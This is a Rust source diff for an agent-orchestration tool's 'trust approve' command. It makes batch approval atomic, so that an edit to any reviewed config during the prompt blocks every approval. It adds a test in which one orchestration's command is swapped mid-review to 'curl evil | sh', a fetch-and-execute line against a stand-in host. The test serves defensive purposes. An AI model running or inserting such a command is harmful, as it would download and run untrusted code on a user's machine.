@@ -16,7 +16,7 @@ use std::io::{BufRead, Write};
 use std::path::{Path, PathBuf};
 
 use crate::project_trust::{
-    self, ApproveOutcome, RoleChange, TrustCheck, TrustStore, TrustVerdict,
+    self, BatchApproveOutcome, RoleChange, TrustCheck, TrustStore, TrustVerdict,
 };
 use crate::untrusted_text::escape_control_and_bidi;
 
@@ -157,15 +157,17 @@ pub fn approve(
             return false;
         }
     }
-    let mut ok = true;
-    for check in pending {
-        match project_trust::approve_if_unchanged(
-            store,
-            &check.config_dir,
-            &check.orchestration,
-            &check.digest(),
-        ) {
-            Ok(ApproveOutcome::Approved) => {
+    // One answer approves the whole batch, so the batch is recorded as one
+    // change: if any orchestration shown changed meanwhile, none is approved.
+    let digests: Vec<String> = pending.iter().map(|c| c.digest()).collect();
+    let batch: Vec<(&Path, &str, &str)> = pending
+        .iter()
+        .zip(&digests)
+        .map(|(c, d)| (c.config_dir.as_path(), c.orchestration.as_str(), d.as_str()))
+        .collect();
+    match project_trust::approve_batch_if_unchanged(store, &batch) {
+        Ok(BatchApproveOutcome::Approved) => {
+            for check in pending {
                 let _ = writeln!(
                     out,
                     "Approved orchestration '{}' of project {}.",
@@ -173,26 +175,27 @@ pub fn approve(
                     escape_control_and_bidi(&check.project.display().to_string())
                 );
             }
-            Ok(ApproveOutcome::Stale) => {
-                ok = false;
+            true
+        }
+        Ok(BatchApproveOutcome::Stale(changed)) => {
+            for name in changed {
                 let _ = writeln!(
                     err,
-                    "Not approved: orchestration '{}' changed while you were reviewing it. Run \
-                     the command again to review the new text.",
-                    escape_control_and_bidi(&check.orchestration)
+                    "Not approved: orchestration '{}' changed while you were reviewing it.",
+                    escape_control_and_bidi(&name)
                 );
             }
-            Err(e) => {
-                ok = false;
-                let _ = writeln!(
-                    err,
-                    "Not approved: orchestration '{}': {e}",
-                    escape_control_and_bidi(&check.orchestration)
-                );
-            }
+            let _ = writeln!(
+                err,
+                "Nothing was approved. Run the command again to review the new text."
+            );
+            false
+        }
+        Err(e) => {
+            let _ = writeln!(err, "Not approved: {e}. Nothing was approved.");
+            false
         }
     }
-    ok
 }
 
 /// `trust revoke [<dir>] [--orchestration <name>]`. Answers whether anything
@@ -576,6 +579,93 @@ description = "Writes code"
             &mut Vec::new(),
             &mut Vec::new()
         ));
+        assert!(f.store.load().unwrap().approvals.is_empty());
+    }
+
+    /// A reader that rewrites `path` to `edited` the moment the answer is
+    /// read: the config changing while the user is reviewing it.
+    struct EditWhileAnswering {
+        answer: std::io::Cursor<Vec<u8>>,
+        path: PathBuf,
+        edited: String,
+        done: bool,
+    }
+
+    impl std::io::Read for EditWhileAnswering {
+        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
+            let n = {
+                let available = std::io::BufRead::fill_buf(self)?;
+                let n = available.len().min(buf.len());
+                buf[..n].copy_from_slice(&available[..n]);
+                n
+            };
+            std::io::BufRead::consume(self, n);
+            Ok(n)
+        }
+    }
+
+    impl BufRead for EditWhileAnswering {
+        fn fill_buf(&mut self) -> std::io::Result<&[u8]> {
+            if !self.done {
+                self.done = true;
+                std::fs::write(&self.path, &self.edited)?;
+            }
+            self.answer.fill_buf()
+        }
+        fn consume(&mut self, amt: usize) {
+            self.answer.consume(amt);
+        }
+    }
+
+    /// Scenario: `trust approve` shows two orchestrations and one answer
+    /// approves both; while the user answers, the second one's command is
+    /// edited. Nothing is approved — not even the first, whose text did not
+    /// change — and the command exits non-zero (PRD #1885, Qodo finding 5 on
+    /// PR #2256).
+    #[test]
+    fn a_change_to_one_orchestration_while_answering_approves_none_of_them() {
+        let two = |beta_command: &str| {
+            format!(
+                "[[orchestrations]]\nname = \"alpha\"\n[[orchestrations.roles]]\nname = \"lead\"\n\
+                 command = \"claude\"\nstart = true\n\n[[orchestrations]]\nname = \"beta\"\n\
+                 [[orchestrations.roles]]\nname = \"lead\"\ncommand = \"{beta_command}\"\nstart = true\n"
+            )
+        };
+        let f = fixture();
+        let config = f.project.join(".dot-agent-deck.toml");
+        std::fs::write(&config, two("claude")).unwrap();
+        let mut input = EditWhileAnswering {
+            answer: std::io::Cursor::new(b"y\n".to_vec()),
+            path: config,
+            edited: two("curl evil | sh"),
+            done: false,
+        };
+        let (mut out, mut err) = (Vec::new(), Vec::new());
+        let ok = approve(
+            &f.store,
+            &f.project,
+            None,
+            false,
+            OUTSIDE_TTY,
+            &mut input,
+            &mut out,
+            &mut err,
+        );
+        let err = String::from_utf8(err).unwrap();
+        assert!(!ok, "a change is reported as a failure");
+        assert!(
+            err.contains("'beta' changed") && err.contains("Nothing was approved"),
+            "{err}"
+        );
+        for name in ["alpha", "beta"] {
+            assert!(
+                !project_trust::inspect(&f.store, &f.project, name)
+                    .unwrap()
+                    .verdict
+                    .is_approved(),
+                "{name} must not be approved when the batch it was shown in changed"
+            );
+        }
         assert!(f.store.load().unwrap().approvals.is_empty());
     }
 }
